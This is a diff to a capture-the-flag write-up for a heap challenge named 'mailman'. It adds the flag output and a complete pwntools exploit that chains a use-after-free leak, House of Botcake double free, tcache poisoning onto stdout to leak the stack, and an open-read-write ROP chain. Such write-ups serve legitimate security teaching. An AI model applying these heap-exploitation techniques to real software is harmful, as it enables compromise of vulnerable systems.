@@ -104,7 +104,7 @@ We'll use this attack to leak a stack address by overwriting stdout's file struc
 
 I'll cover this in detail when I started solving File Structure Exploits but for now this is all you need to know: 
 
-```python
+```c
 struct _IO_FILE
 {
   int _flags;		/* High-order word is _IO_MAGIC; rest is flags. */
@@ -127,7 +127,233 @@ struct _IO_FILE
 
 ![filest](https://github.com/user-attachments/assets/949e983f-b669-4c17-8937-27a0a25465b1)
 
-Or if we set `char* _IO_read_end` and `char* _IO_write_bas`e the beginning of a memory that we want to write out and we set `chat* _IO_write_ptr` to the end of that value and everything else to `NULL`, we will be able to leak out a value of our choosing.
+Or if we set `char* _IO_read_end` and `char* _IO_write_base` the beginning of a memory that we want to write out and we set `chat* _IO_write_ptr` to the end of that value and everything else to `NULL`, we will be able to leak out a value of our choosing.
 
-With this we'll get a stack leak and now we just need to ROP from somewhere.. main() doesn't exit, so I targeted *fgets()* saved_rip. 
+With this we'll get a stack leak and now we just need to ROP from somewhere.. main() doesn't exit, so I targeted *fgets()* saved_rip and write out the flag.
+
+```
+[*] Loaded 218 cached gadgets for './libc.so.6'
+[*] Switching to interactive mode
+ictf{i_guess_the_post_office_couldnt_hide_the_heapnote_underneath_912b123f}
+\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00
+```
+
+
+### Full Exploit
+```python
+#!/usr/bin/env python3
+
+from pwn import *
+import time
+
+'''
+p = gdb.debug("./mailman_patched", gdbscript="""
+    c
+""")
+'''
+p = process("./mailman_patched")
+
+context.arch = 'amd64'
+
+def malloc_letter(idx, size, content):
+    p.sendline(b"1")
+    p.recvuntil(b"idx: ")
+    p.sendline(str(idx).encode('utf-8'))
+    p.recvuntil(b"letter size: ")
+    p.sendline(str(size).encode('utf-8'))
+    p.recvuntil(b"content: ")
+    p.sendline(content)
+
+def free_letter(idx):
+    p.sendline(b"2")
+    p.recvuntil(b"idx: ")
+    p.sendline(str(idx).encode('utf-8'))
+
+def read_letter(idx):
+    p.sendline(b"3")
+    p.recvuntil(b"idx: ")
+    p.sendline(str(idx).encode('utf-8'))
+    leak = int.from_bytes(p.recvline().strip(), 'little')
+    return leak 
+
+def demangle(ptr):
+    mid = ptr ^ (ptr >> 12)
+    return mid ^ (mid >> 24)
+
+# leak mangled_ptr (UAF)
+content = b"aaaa"
+p.recvuntil(b">")
+malloc_letter(0, 20, content)
+malloc_letter(1, 20, content)
+
+free_letter(0)
+free_letter(1)
+
+mangled_ptr = read_letter(0)
+print(f"mangled ptr: {hex(mangled_ptr)}")
+
+# demangle it 
+ptr = demangle(mangled_ptr)
+print(f"demangled ptr: {hex(ptr)}")
+
+# leak the libc address in unsorted bin
+for i in range(9):
+    content = b"bbbb"
+    malloc_letter(i+2, 130, content)
+    time.sleep(0.1)
+
+for i in range(8):
+    free_letter(i+2)
+    time.sleep(0.1)
+
+libc_leak = read_letter(9)
+# print(hex(libc_leak))
+
+libc_base = libc_leak - 2202848
+print(f"libc base at: {hex(libc_base)}")
+
+# malloc until you empty the bins 
+# size - 0x10 for the metadata
+print("cleaning tcache and smallbins...")
+for i in range(7):
+    malloc_letter(15, 0x10, b'a')
+for i in range(7):
+    malloc_letter(15, 0x60, b'a')
+for i in range(7):
+    malloc_letter(15, 0x70, b'a')
+for i in range(7):
+    malloc_letter(15, 0x80, b'a')
+for i in range(5):
+    malloc_letter(15, 0xc0, b'a')
+for i in range(2):
+    malloc_letter(15, 0xd0, b'a')
+for i in range(2):
+    malloc_letter(15, 0xe0, b'a')
+for i in range(9):
+    malloc_letter(15, 0x60, b'a')
+for i in range(9):
+    malloc_letter(15, 0x10, b'a')
+for i in range(2):
+    malloc_letter(15, 0x70, b'a')
+for i in range(1):
+    malloc_letter(15, 0x80, b'a')
+
+### HOUSE OF BOTCAKE
+# allocate 7 chunks to fill tcache later  
+for i in range(7):
+    malloc_letter(i+3, 256, b"a")
+
+# for later consolidation (previous chunk)
+malloc_letter(0, 256, b"aaaa")
+# victum chunk 
+malloc_letter(1, 256, b"bbbb")
+# small barrier chunk (to prevent any further consodilation past our victim chunk)
+# also, will use when we call OPEN with this chunk's addr as a pointer to "flag.txt"
+malloc_letter(2, 16, b"flag.txt\00")
+
+# now cause chunk overlapping
+# fill up tcache list
+for i in range(7):
+    free_letter(i+3)
+
+# free the victim chunk so it will be added to unsorted bin
+free_letter(1)
+
+# free the previous chunk and make it consolidate with the victim chunk
+free_letter(0)
+
+# open up a slot in the tcache for our victim
+malloc_letter(15, 256, b"aaaa")
+
+# vulnerability (DOUBLE FREE)
+# now victim is in tcache
+free_letter(1)
+
+# we have fully control over on this chunk
+# size should be big enough to overwrite the metadata 
+# trick malloc return to arbitrary pointer (stdout file struct to leak a stack addr)
+environ = libc_base + 2232832
+stdout = libc_base + 2205568
+print(f"environ at:  + {hex(environ)}")
+print(f"stdout at: + {hex(stdout)}")
+
+payload = b"A" * 264 + p64(0x111)
+
+# addr should be mangled
+payload += p64(stdout ^ ((ptr + 6928) >> 12))
+malloc_letter(2, 304, payload)
+
+# now malloc returned a pointer to stdout
+malloc_letter(3, 256, b"")
+
+### FILE STRUCT arbitrary write
+
+'''
+# testing pwntools FileStructure() feature
+# print out to compare stuff..
+# too big to send, maybe slice it
+
+fp = FileStructure()
+fp.flags = 0xfbad1800
+fp._IO_write_end = environ + 8
+fp.write(environ, 8)
+fp._IO_buf_base = environ
+fp._IO_buf_end = environ + 8
+
+print(fp)
+print(bytes(fp))
+
+malloc_letter(3, 256, new_fp)
+'''
+
+# writing from arbitrary memory to stdout
+payload = p64(0xfbad1800)
+payload += p64(environ) * 3
+payload += p64(environ)
+payload += p64(environ + 0x8) * 2
+payload += p64(environ+8)
+payload += p64(environ+8)
+malloc_letter(4, 256, payload)
+
+stack_leak = u64(p.recv(8).strip().ljust(8, b'\x00'))
+print(f"stack leak: {hex(stack_leak)}")
+
+### with this stack leak, time to ROP our way out of this..
+# free victim and previous chunk to do ROP this time
+
+free_letter(1)
+free_letter(0)
+
+payload = b"A" * 264 + p64(0x111)
+
+# overwrite the saved rip of fgets()
+saved_rip = stack_leak - 392 
+
+# addr should be mangled 
+payload += p64(saved_rip ^ ((ptr + 6928) >> 12))
+malloc_letter(2, 304, payload)
+print(f"saved rip of fgets(): {hex(saved_rip)}")
+
+# pwntools ROP
+# ORW syscalls are permitted (Open - Read - Write)
+# use them to get the flag
+
+flag = ptr + 7200
+output = flag + 0x20
+
+libc = ELF("./libc.so.6")
+libc.address = libc_base
+rop = ROP(libc)
+payload = b"B" * 40
+rop.call('syscall', [2, flag, 0, 0])
+rop.call('syscall', [0, 3, output, 0x64])
+rop.call('syscall', [1, 1, output, 0x64])
+
+# gdb.attach(p)
+# print(rop.dump())
+malloc_letter(3, 256, b"xx")
+malloc_letter(3, 256, payload + rop.chain())
+
+p.interactive()
+```
 
